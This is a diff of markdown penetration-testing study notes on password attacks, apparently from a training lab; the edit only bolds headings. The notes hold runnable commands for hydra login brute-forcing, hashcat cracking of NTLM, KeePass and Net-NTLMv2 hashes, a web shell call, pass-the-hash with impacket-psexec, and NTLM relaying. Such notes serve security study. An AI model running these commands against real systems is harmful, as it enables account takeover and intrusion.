@@ -706,7 +706,7 @@ Install Wsgidav (Web Distributed Authoring and Versioning): allow clients to upl
   - `curl -k https://192.168.50.45/uploads/shell.php?cmd=whoami`  
      
 ### 15. Password attacks  
-- attack network services login  
+- **attack network services login**  
   - SSH  
    `hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201`  -l username, -p password wordlist, -s port  
   - RDP (password spraying)  
@@ -714,7 +714,7 @@ Install Wsgidav (Web Distributed Authoring and Versioning): allow clients to upl
    `hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202`  
   - HTTP POST login  
    `hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"` -l user, -P wordlist, http-post-form
-- mutating wordlist
+- **mutating wordlist**
   - `echo -n "secret" | sha256sum`: hash secret
   - `sed -i '/^1/d' demo.txt` remove all passwords start with '1'
   - [rule-based attack](https://hashcat.net/wiki/doku.php?id=rule_based_attack) mutate password
@@ -742,11 +742,11 @@ Install Wsgidav (Web Distributed Authoring and Versioning): allow clients to upl
     `hashcat -m 0 crackme.txt /usr/share/wordlists/rockyou.txt -r demo3.rule --force`  -m hash type, 0 is MD5
     Output cracked status: f621b6c9eab51a3e2f4e167fee4c6860:Computer123! 
   - hashcat rules `ls -la /usr/share/hashcat/rules/`
-- craking methodology: extract hashed > format hashes > calculate the cracking time > prepare wordlist > attack the hash
+- **craking methodology**: extract hashed > format hashes > calculate the cracking time > prepare wordlist > attack the hash
  - identify the hash type:[hash-identifier](https://www.kali.org/tools/hash-identifier/), [hashid](https://www.kali.org/tools/hashid/)
  - hash-identifier "4a41e0fdfb57173f8156f58e49628968a8ba782d0cd251c6f3e2426cb36ced3b647bf83057dabeaffe1475d16e7f62b7": SHA-384
  - bcrypt hashes always start with $2a$, $2b$, or $2y$: "$2y$10$XrrpX8RD6IFvBwtzPuTlcOqJ8kO2px2xsh17f60GZsBKLeszsQTBC"  
-- Password mananger
+- **Password mananger**
   - Searching for KeePass database files
     `Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue`
   - transfer the db file to our Kali
@@ -760,7 +760,7 @@ Install Wsgidav (Web Distributed Authoring and Versioning): allow clients to upl
     `hashcat --help | grep -i "KeePass"`  > 13400 | KeePass 1 (AES/Twofish) and KeePass 2 (AES)  | Password Manager
   - Cracking the KeePass database hash
     `hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force` > qwertyuiop123!
-- SSH private key passphrase
+- **SSH private key passphrase**
   - Using ssh2john to format the hash  
     `ssh2john id_rsa > ssh.hash`  `cat ssh.hash` 
     id_rsa:$sshng**$6**$16$7059e78a8d3764ea1e8...  
@@ -786,7 +786,7 @@ Install Wsgidav (Web Distributed Authoring and Versioning): allow clients to upl
    chmod 600 id_rsa
    ssh -i id_rsa -p 2222 dave@192.168.161.201
    ```
-- password hashes  
+- **password hashes**  
   - Cracking NTLM
     - NTLM (NT LAN Manager) is a Windows authentication protocol. Hashes stored in C:\Windows\system32\config\sam. Dumped via lsass.exe, pwdump, Mimikatz
     - Goals: get plaintext password from NTLM hash > pivot to othe system > reuse credentials (pass-the-hash, RDP, SMB)
@@ -822,7 +822,7 @@ Install Wsgidav (Web Distributed Authoring and Versioning): allow clients to upl
       `hashcat --help | grep -i "ntlm"` >  1000 | NTLM  | Operating System
     - Crack by using rockyou.txt and best64.rule
       `hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`  
-  - Passing NTLM
+  - **Passing NTLM**
     - pass-the-hash (PtH) technique: authenticate to a local or remote target with a valid combination of username and NTLM hash rather than a plaintext password
     - scenario: gained access to FILES01 as user 'gunther' > want to extract admin NTLM hash and authenticate to FILES02 (SMB share). Assume same password in FILES01 and FILES02
     - [smbclient](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html), [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec): SMB enumeration and management
@@ -842,7 +842,7 @@ Install Wsgidav (Web Distributed Authoring and Versioning): allow clients to upl
     - **psexec** to get an interactive shell
       `impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212`
       `C:\Windows\system32> hostname`
-  - Cracking Net-NTLMv2
+  - **Cracking Net-NTLMv2**
     - goal: gain access to an SMB share on a Windows 2022 server from a Windows 11 client via NTLMv2
     - NTLM Authentication over SMB
       1. Client → Server: Hello, I want to connect to your SMB share. Here's my username.
@@ -876,7 +876,7 @@ Install Wsgidav (Web Distributed Authoring and Versioning): allow clients to upl
       hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force
       ```
    - RDP as paul `xfreerdp3 /u:paul /p:123Password123 /v:192.168.139.211 /cert:ignore /drive:share,/home/kali/share`
-  - Relaying Net-NTLMv2
+  - **Relaying Net-NTLMv2**
     - sudo ip l s dev tun0 mtu 1250  
     - bind shell to create an SMB connection to Kali > forward to another target (UAC disabled)
     - [ntlmrelayx](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py): setting up SMB server and relaying authentication
